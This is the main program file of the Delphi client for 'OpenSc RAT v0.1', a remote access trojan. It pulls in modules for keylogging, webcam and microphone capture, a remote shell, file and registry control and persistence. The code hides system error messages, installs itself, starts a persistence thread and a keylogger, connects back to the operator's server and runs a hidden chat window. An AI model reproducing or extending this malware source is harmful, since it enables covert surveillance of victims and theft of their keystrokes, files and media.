program Client;

{
  OpenSc RAT v0.1 - Client part (https://www.OpenSc.ws)

  Last modification: 04/11/2017 by wrh1d3 [wrh1d3@gmail.com / wrh1d3@xmpp.jp]
}

uses
  Windows,
  SysUtils,
  SocketUnitEx in '..\Units\SocketUnitEx.pas',
  uCryptoGear in '..\Units\uCryptoGear.pas',
  UnitCommands in '..\Units\UnitCommands.pas',
  UnitEncryption in '..\Units\UnitEncryption.pas',
  UnitUtils in '..\Units\UnitUtils.pas',
  ZLibEx in '..\Units\ZLibEx\ZLibEx.pas',
  UnitConnection in 'UnitConnection.pas',
  UnitConfiguration in '..\Units\UnitConfiguration.pas',
  UnitInformations in 'UnitInformations.pas',
  GetSecurityCenterInfo in 'GetSecurityCenterInfo.pas',
  ACMConvertor in '..\Units\ACM\ACMConvertor.pas',
  ACMIn in '..\Units\ACM\ACMIn.pas',
  ListUnit in '..\Units\ACM\ListUnit.pas',
  MSAcm in '..\Units\ACM\MSACM.pas',
  Direct3D9 in 'DirectX\Direct3D9.pas',
  DirectDraw in 'DirectX\DirectDraw.pas',
  DirectShow9 in 'DirectX\DirectShow9.pas',
  DirectSound in 'DirectX\DirectSound.pas',
  DXTypes in 'DirectX\DXTypes.pas',
  GDIPAPI in 'GDIP\GDIPAPI.pas',
  GDIPOBJ in 'GDIP\GDIPOBJ.pas',
  GDIPUTIL in 'GDIP\GDIPUTIL.pas',
  uCamHelper in 'Webcam\uCamHelper.pas',
  UnitStartWebcam in 'Webcam\UnitStartWebcam.pas',
  VFrames in 'Webcam\VFrames.pas',
  VSample in 'Webcam\VSample.pas',
  UnitFilesManager in 'UnitFilesManager.pas',
  UnitRegistryManager in 'UnitRegistryManager.pas',
  UnitTasksManager in 'UnitTasksManager.pas',
  UnitShell in 'UnitShell.pas',
  UnitCapture in 'UnitCapture.pas',
  ClassesMOD in 'ClassesMOD.pas',
  UnitChat in 'UnitChat.pas',
  UnitKeylogger in 'UnitKeylogger.pas',
  UnitMicrophone in 'UnitMicrophone.pas',
  UnitInstallation in 'UnitInstallation.pas',
  UnitPersistence in 'UnitPersistence.pas';

//{$R *.res}  to avoid application to load icon in resource file project

var
  Msg: TMsg;
begin
  NoErrMsg := True; //disable error message display from system
  SetErrorMode(SEM_FAILCRITICALERRORS or SEM_NOALIGNMENTFAULTEXCEPT or
    SEM_NOGPFAULTERRORBOX or SEM_NOOPENFILEERRORBOX);

  //load configuration settings
  if LoadConfiguration('CFG', Configuration) = False then ExitProcess(0);

  //check mutex
  if Configuration.Mutex <> '' then
  begin
    CreateMutex(nil, False, PChar(Configuration.Mutex));
    if GetLastError = ERROR_ALREADY_EXISTS then ExitProcess(0);
  end;
               
  //install file and get installation path now
  if Configuration.Install then ClientFile := InstallClient else
    ClientFile := ParamStr(0);

  //start persistence thread
  if Configuration.Persistence then 
  begin
    TmpMutex := CreateMutex(nil, False, PChar(Configuration.Mutex + '_PERSIST'));
    if GetLastError <> ERROR_ALREADY_EXISTS then MyStartThread(@Persistence) else
    CloseHandle(TmpMutex); //check if another persitence process is running
  end;

  //start keylogger
  if Configuration.Keylogger then
  begin
    LogsDir := ExtractFilePath(ParamStr(0)) + 'Logs'; //set logs folder name before starting keys capture
    StartKeylogger; //WARNING: Don't work in a thread!
  end;

  MyStartThread(@StartConnection); //start connection thread to server
  CreateChatWindow; //create chat window in hidden mode

  //stay alive!
  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end; 
end.
